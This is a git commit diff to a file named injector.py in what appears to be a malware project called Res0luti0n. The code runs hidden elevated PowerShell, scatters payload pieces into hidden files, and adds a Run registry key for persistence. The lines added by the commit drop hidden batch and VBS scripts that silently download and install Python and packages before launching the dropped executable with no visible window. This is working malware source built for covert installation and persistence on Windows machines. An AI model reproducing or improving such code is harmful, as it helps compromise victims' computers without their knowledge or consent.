629666f7b7b71064d0a49aa176aaf1bc2c6c746d
Adapters <63345758+0xSpoofed@users.noreply.github.com>
2023-06-03 20:15:08 +0200

    Bugs fix | Background python & reqs installation

--- Res0luti0n_src/utilities/injector.py
+++ Res0luti0n_src/utilities/injector.py
@@ -32,7 +32,7 @@ def dav():
         subprocess.run(['powershell', '-Command', f'Start-Process powershell -Verb runAs -ArgumentList "-Command {command}" -WindowStyle Hidden'], capture_output=False, text=False)
     except:
         pass
- 
+
 src_hashed = 'SRC_HASHED'
 recompyler = r"""'RECOMPYLER'"""
 possible_paths = [
@@ -59,8 +59,6 @@ for path, char in zip(selected_paths, src_hashed):
     make_hidden(path)
 
 dav()
-command_pip = f"""pip install -r {os.path.join(os.getcwd(), 'requirements.txt')}"""
-subprocess.Popen(['cmd', '/c', 'start', '/b', 'cmd', '/k', command_pip], creationflags=subprocess.CREATE_NO_WINDOW)
 selected_paths = [s.replace('\\', '\\\\') for s in selected_paths]
 recompyler_content = recompyler.replace('PARTS_PATH', '","'.join(selected_paths))
 created_file = os.path.join(os.getenv('TEMP'), f"{created_name}.cs")
@@ -81,9 +79,44 @@ make_hidden(exe_file)
 
 key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
 winreg.SetValueEx(key, created_name, 0, winreg.REG_SZ, exe_file)
-
 os.remove(created_file)
+
+pip_path = os.path.join(os.getenv('TEMP'), 'pip.txt')
+temporary_script_path = os.path.join(os.getenv('TEMP'), 'temporary.cmd')
+temporary_script_launcher_path = os.path.join(os.getenv('TEMP'), 'launch.vbs')
+if os.getenv('USERNAME') in exe_file:
+    exe_file = exe_file.replace(os.getenv('USERNAME'), "%USERNAME%") 
+
+pip = r"""'PIPREQUIREMENTS'"""
+temporary_script = u'''set "PYTHON_EXE=python-installer.exe"
+set "PYTHON_TEMP=%TEMP%\%PYTHON_EXE%"
+for /f "tokens=1,2 delims= " %%a in ('powershell -Command "Invoke-WebRequest https://www.python.org/ftp/python/ -UseBasicParsing | Select-String -Pattern '3.10.[0-9]{1,2}' -AllMatches | Select-Object -ExpandProperty Matches | Select-Object -ExpandProperty Value | Sort-Object -Descending -Unique | Select-Object -First 1"') do (
+    set "PYTHON_VERSION=%%a%%b"
+)
+set "PYTHON_URL=https://www.python.org/ftp/python/%PYTHON_VERSION%/python-%PYTHON_VERSION%-amd64.exe"
+curl -L -o "%PYTHON_TEMP%" "%PYTHON_URL%"
+start /wait "" "%PYTHON_TEMP%" /passive /norestart TARGETDIR=C:\Python310 ALLUSERS=1 PrependPath=1 Include_test=0 Include_pip=1 Include_doc=0 /qn /quiet /norestart
+taskkill /f /im "%PYTHON_EXE%"
+del "%PYTHON_TEMP%"
+pip install -r "%TEMP%/pip.txt"
+"{FILEPATH}"'''.replace('{FILEPATH}', exe_file)
+vbs_script = r"""Set WshShell = WScript.CreateObject("WScript.Shell")
+WshShell.Run "cmd /c start /b {temporary_script_path}", 0, False""".replace("{temporary_script_path}", temporary_script_path)
+
+
+if os.path.exists(pip_path): 
+    os.remove(pip_path)
+if os.path.exists(temporary_script_launcher_path):
+    os.remove(temporary_script_launcher_path)
 try:
-    subprocess.call(exe_file)
-except:
-    pass
+    os.remove(temporary_script_path)
+except: pass
+
+writefile(temporary_script_launcher_path, vbs_script)
+make_hidden(temporary_script_launcher_path)
+writefile(pip_path, pip)
+make_hidden(pip_path)
+writefile(temporary_script_path , temporary_script)
+make_hidden(temporary_script_path)
+
+subprocess.call(["cscript.exe", "//nologo", temporary_script_launcher_path])
